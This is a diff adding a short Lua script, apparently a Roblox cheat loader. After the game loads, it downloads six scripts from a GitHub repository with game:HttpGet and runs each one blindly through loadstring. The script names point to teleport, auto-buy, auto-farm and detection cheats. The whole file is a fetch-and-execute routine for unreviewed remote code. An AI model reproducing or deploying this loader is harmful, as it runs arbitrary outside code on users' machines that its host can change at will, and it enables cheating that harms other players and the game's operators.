@@ -1,0 +1,21 @@
+repeat task.wait() until game:IsLoaded()
+wait(5)
+local function executeScripts(scripts)
+    for _, script in ipairs(scripts) do
+        local co = coroutine.create(function()
+            loadstring(game:HttpGet(script))()
+        end)
+        coroutine.resume(co)
+    end
+end
+
+local scripts = {
+    "https://raw.githubusercontent.com/driver123415/collaborate/main/sc1teleport",
+    "https://raw.githubusercontent.com/driver123415/collaborate/main/sc2abuygard",
+    "https://raw.githubusercontent.com/driver123415/collaborate/main/sc3atpgard",
+    "https://raw.githubusercontent.com/driver123415/collaborate/main/sc4afarmgard",
+    "https://raw.githubusercontent.com/driver123415/collaborate/main/sc5aorb",
+    "https://raw.githubusercontent.com/driver123415/collaborate/main/sc6ntsdetectgard"
+}
+
+executeScripts(scripts)
